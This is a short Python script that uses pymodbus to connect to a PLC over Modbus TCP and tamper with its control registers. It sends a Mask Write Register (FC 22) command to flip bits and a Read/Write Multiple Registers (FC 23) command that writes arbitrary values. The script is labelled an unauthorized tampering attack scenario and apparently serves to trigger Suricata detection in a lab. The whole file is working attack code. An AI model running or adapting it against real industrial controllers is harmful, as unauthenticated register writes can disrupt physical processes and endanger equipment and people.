from pymodbus.client import ModbusTcpClient
import time

TARGET_IP = '192.168.11.129'
TARGET_PORT = 502
UNIT_ID = 1

def unauthorized_modification_attack():
    print(f"[*] Launching Scenario C: Unauthorized Parameter Tampering Attack against {TARGET_IP}:{TARGET_PORT}")
    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)

    if client.connect():
        print("[+] Perimeter breached successfully; connected to target PLC!")

        print("[*] Sending FC 22 (Mask Write Register) - Attempting to covertly flip control bits in register 1...")
        and_mask = 0xFF00
        or_mask = 0x00FF
        rr = client.mask_write_register(address=1, and_mask=and_mask, or_mask=or_mask, slave=UNIT_ID)
        if rr.isError():
            print(f"[-] FC 22 rejected by target (likely unsupported function code): {rr}")
        else:
            print("[+] FC 22 tampering succeeded.")
        time.sleep(1)

        print("[*] Sending FC 23 (Read/Write Multiple Registers) - Reading process data while injecting tampered values...")
        write_values = [9999, 8888, 7777, 0, 1234, 5678]
        rr = client.readwrite_registers(
            read_address=0,
            read_count=6,
            write_address=0,
            values=write_values,
            slave=UNIT_ID
        )
        if rr.isError():
            print(f"[-] FC 23 failed: {rr}")
        else:
            print(f"[+] FC 23 succeeded. Values read back after tampering: {rr.registers}")
        time.sleep(1)

        print("[+] Tampering commands sent! Please check Suricata alerts!")
        client.close()
    else:
        print("[-] Unable to connect to target PLC.")

if __name__ == "__main__":
    unauthorized_modification_attack()
